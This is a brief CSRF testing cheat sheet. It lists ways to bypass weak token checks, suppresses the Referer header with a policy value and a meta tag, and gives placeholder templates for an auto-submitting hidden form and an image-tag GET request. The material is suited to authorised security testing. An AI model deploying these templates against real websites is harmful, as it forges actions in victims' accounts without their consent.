# CSRF
## Quick Wins
- Unused / Unchecked CSRF token
	- Change HTTP Request method
- Same / Guessable CSRF token (Using username / UID etc.)

## Dropping Headers
**Useful for making sure headers are not sent**
### Referrer Header
**Changing page location to include intended path**
`Referrer-Policy: unsafe-url`
`<meta name="referrer" content="no-referrer">`


## Delivery Methods
- Forms :
**Note Multiple form requests must be displaced with setTimeout. **
**If hosting own web server, use Jquery**
```html
<form id='exploit' action='<URL>' method='<METHOD>'>
<input name="<NAME>" value="<VALUE>" /> # For standard values
<textarea name="<NAME>"><STUFF></textarea> # For URL encoded values (%0d%0a, etc)
</input>

<script>
document.getElementById('exploit').submit();
</script>
```

- Images:
**Note Images only support GET only**
```html
<img src=<URL> onerror=<CALLBACK> />
```